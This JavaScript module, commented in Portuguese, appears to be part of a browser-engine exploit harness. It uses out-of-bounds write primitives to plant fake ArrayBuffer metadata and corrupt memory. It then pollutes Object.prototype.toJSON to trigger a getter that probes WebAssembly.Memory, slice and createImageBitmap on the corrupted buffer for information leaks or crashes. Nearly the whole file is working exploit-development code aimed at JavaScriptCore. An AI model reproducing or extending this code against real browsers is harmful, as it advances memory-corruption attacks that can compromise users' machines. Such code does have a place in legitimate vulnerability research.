// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForApiTest"; // Usado na última versão do teste
let getter_called_flag = false;
let current_test_results = { success: false, message: "Teste não iniciado.", error: null, info: null };

const SHADOW_DATA_POINTER = new AdvancedInt64(0x1, 0x0);
const SHADOW_SIZE = new AdvancedInt64(0x1000, 0x0);

class CheckpointObjectForApiTest { // Usado na última versão do teste
    constructor(id) {
        this.id = `ApiTestCheckpoint-${id}`;
    }
}

export function toJSON_TriggerApiTestGetter() { // Usado na última versão do teste
    const FNAME_toJSON = "toJSON_TriggerApiTestGetter";
    if (this instanceof CheckpointObjectForApiTest) {
        logS3(`toJSON: 'this' é Checkpoint. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        try {
            // eslint-disable-next-line no-unused-vars
            const val = this[GETTER_CHECKPOINT_PROPERTY_NAME]; // Aciona o getter
        } catch (e) {
            logS3(`toJSON: Erro ao acessar getter: ${e.message}`, "error", FNAME_toJSON);
        }
    }
    return this.id;
}

// A função exportada mantém o nome para compatibilidade com runAllAdvancedTestsS3.mjs
export async function executeRetypeOOB_AB_Test() {
    const FNAME_TEST = "executeApiInteractionTest"; // Nome interno da última versão do teste
    logS3(`--- Iniciando Teste de Interação com API no Getter ---`, "test", FNAME_TEST);

    getter_called_flag = false;
    current_test_results = { success: false, message: "Teste não executado ou getter não chamado.", error: null, info: null };

    // Validação de Config (simplificada, assumindo que JSC_OFFSETS e suas subpropriedades necessárias existem)
    if (!JSC_OFFSETS || !JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID) {
        logS3("Offsets críticos não definidos em config.mjs. Abortando teste.", "critical", FNAME_TEST);
        current_test_results.message = "Offsets críticos não definidos.";
        // Adicione um log de console mais detalhado aqui se necessário para depurar config.mjs
        return;
    }

    let toJSONPollutionApplied = false;
    let getterPollutionApplied = false;
    let originalToJSONProtoDesc = null;
    let originalGetterDesc = null;
    const ppKey_val = 'toJSON';

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            current_test_results = { success: false, message: "Falha ao inicializar OOB.", error: "OOB env not set" };
            logS3(current_test_results.message, "critical", FNAME_TEST);
            return;
        }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

        // 1. Plantar "Metadados Sombra" (ArrayBufferContents falsos)
        const shadow_contents_offset_in_oob_data = 0x0;
        oob_write_absolute(shadow_contents_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, SHADOW_SIZE, 8);
        oob_write_absolute(shadow_contents_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, SHADOW_DATA_POINTER, 8);
        logS3(`Metadados sombra plantados: ptr=${SHADOW_DATA_POINTER.toString(true)}, size=${SHADOW_SIZE.toString(true)}`, "info", FNAME_TEST);

        // 2. Realizar a escrita OOB "gatilho"
        const corruption_trigger_offset_abs = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
        const corruption_value = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
        oob_write_absolute(corruption_trigger_offset_abs, corruption_value, 8);
        logS3(`Escrita OOB gatilho em ${toHex(corruption_trigger_offset_abs)} do oob_data completada.`, "info", FNAME_TEST);

        // 3. Configurar o getter e poluir
        const checkpoint_obj = new CheckpointObjectForApiTest(1);
        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForApiTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);

        Object.defineProperty(CheckpointObjectForApiTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
            // AQUI ESTÁ A CORREÇÃO: ADICIONADO 'async'
            get: async function() {
                getter_called_flag = true;
                const FNAME_GETTER = "ApiTest_Getter";
                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Testando APIs...`, "vuln", FNAME_GETTER);
                current_test_results = { success: false, message: "Getter chamado, teste de API em andamento.", error: null, info: null };

                let info_observed = [];

                // Teste 1: WebAssembly.Memory
                try {
                    logS3("DENTRO DO GETTER (API Test 1): new WebAssembly.Memory(oob_array_buffer_real)...", "info", FNAME_GETTER);
                    // @ts-ignore
                    let wa_mem = new WebAssembly.Memory(oob_array_buffer_real);
                    info_observed.push(`WebAssembly.Memory(oob_ab) SUCESSO INESPERADO. Buffer length: ${wa_mem.buffer?.byteLength}`);
                    logS3(`DENTRO DO GETTER (API Test 1): WebAssembly.Memory criado INESPERADAMENTE. Buffer: ${wa_mem.buffer}`, "warn", FNAME_GETTER);
                } catch (e) {
                    info_observed.push(`WebAssembly.Memory(oob_ab) Erro: ${e.message}`);
                    logS3(`DENTRO DO GETTER (API Test 1): Erro esperado com WebAssembly.Memory(oob_ab): ${e.message}`, "good", FNAME_GETTER);
                    if (String(e.message).length > 100 || String(e.message).includes("0x")) {
                        current_test_results.success = true;
                        current_test_results.message = "WebAssembly.Memory causou erro potencialmente informativo.";
                    }
                }

                // Teste 2: PostMessage (simulado com slice)
                try {
                    logS3("DENTRO DO GETTER (API Test 2): self.postMessage(oob_array_buffer_real, '*')", "info", FNAME_GETTER);
                    if (typeof self !== 'undefined' && self.postMessage) {
                        let slice = oob_array_buffer_real.slice(0,1);
                        info_observed.push(`postMessage-like (slice): slice.byteLength = ${slice.byteLength}`);
                         logS3(`DENTRO DO GETTER (API Test 2): Slice para simular postMessage OK. Length: ${slice.byteLength}`, "info", FNAME_GETTER);
                    } else {
                        info_observed.push("self.postMessage não disponível neste contexto.");
                         logS3("DENTRO DO GETTER (API Test 2): self.postMessage não disponível.", "warn", FNAME_GETTER);
                    }
                } catch (e) {
                    info_observed.push(`postMessage-like (slice) Erro: ${e.message}`);
                    logS3(`DENTRO DO GETTER (API Test 2): Erro com postMessage-like (slice): ${e.message}`, "error", FNAME_GETTER);
                     if (String(e.message).length > 100 || String(e.message).includes("0x") || String(e.message).toLowerCase().includes("internal error")) {
                        current_test_results.success = true;
                        current_test_results.message = "postMessage-like (slice) causou erro potencialmente informativo.";
                    }
                }
                
                // Teste 3: ImageBitmap (se disponível)
                if (typeof createImageBitmap !== 'undefined') {
                    try {
                        logS3("DENTRO DO GETTER (API Test 3): createImageBitmap(oob_dataview_real)... (esperando erro)", "info", FNAME_GETTER);
                        // @ts-ignore
                        await createImageBitmap(oob_dataview_real); // Esta é a linha que necessita do 'async' no getter
                        info_observed.push(`createImageBitmap(oob_dv) SUCESSO INESPERADO.`);
                        logS3(`DENTRO DO GETTER (API Test 3): createImageBitmap com oob_dataview_real INESPERADAMENTE bem-sucedido.`, "warn", FNAME_GETTER);
                    } catch (e) {
                        info_observed.push(`createImageBitmap(oob_dv) Erro: ${e.message}`);
                        logS3(`DENTRO DO GETTER (API Test 3): Erro esperado com createImageBitmap(oob_dv): ${e.message}`, "good", FNAME_GETTER);
                        if (String(e.message).length > 80 || String(e.message).includes("0x") || String(e.message).toLowerCase().includes("internal error")) {
                            current_test_results.success = true;
                            current_test_results.message = "createImageBitmap causou erro potencialmente informativo.";
                        }
                    }
                } else {
                    info_observed.push("createImageBitmap não disponível.");
                    logS3("DENTRO DO GETTER (API Test 3): createImageBitmap não disponível.", "warn", FNAME_GETTER);
                }

                current_test_results.info = info_observed.join('; ');
                if (!current_test_results.success) {
                    current_test_results.message = "Testes de API no getter não revelaram leaks óbvios ou crashes controlados.";
                }
                return 0xBADF00D;
            },
            configurable: true
        });
        getterPollutionApplied = true;

        originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        Object.defineProperty(Object.prototype, ppKey_val, {value: toJSON_TriggerApiTestGetter, writable: true, enumerable: false, configurable: true});
        toJSONPollutionApplied = true;
        logS3(`Poluições aplicadas.`, "info", FNAME_TEST);

        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) {
            logS3(`Erro JSON.stringify: ${e.message}`, "error", FNAME_TEST);
        }

    } catch (mainError) {
        logS3(`Erro principal: ${mainError.message}`, "critical", FNAME_TEST);
        console.error(mainError);
        current_test_results = { success: false, message: `Erro crítico: ${mainError.message}`, error: String(mainError) };
    } finally {
        // Restauração
        if (toJSONPollutionApplied && Object.prototype.hasOwnProperty(ppKey_val)) {
            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
            else delete Object.prototype[ppKey_val];
        }
        if (getterPollutionApplied && CheckpointObjectForApiTest.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) {
            if (originalGetterDesc) Object.defineProperty(CheckpointObjectForApiTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, originalGetterDesc);
            else delete CheckpointObjectForApiTest.prototype[GETTER_CHECKPOINT_PROPERTY_NAME];
        }
        logS3("Limpeza finalizada.", "info", "CleanupFinal");
    }

    if (getter_called_flag) {
        logS3(`RESULTADO TESTE API: Getter chamado. Sucesso especulativo: ${current_test_results.success}. Msg: ${current_test_results.message}. Info: ${current_test_results.info}`, 
              current_test_results.success ? "vuln" : "warn", FNAME_TEST);
    } else {
        logS3("RESULTADO TESTE API: Getter NÃO foi chamado.", "error", FNAME_TEST);
         // Se o getter não foi chamado, current_test_results pode ter a mensagem de "teste não executado"
        logS3(`  Detalhes do erro (se houver): ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST);
    }
    // Log dos detalhes finais mesmo se o getter não foi chamado, pois pode conter erro de setup.
    logS3(`  Detalhes finais da tentativa: ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST);

    clearOOBEnvironment();
    logS3(`--- Teste de Interação com API Concluído ---`, "test", FNAME_TEST);
}
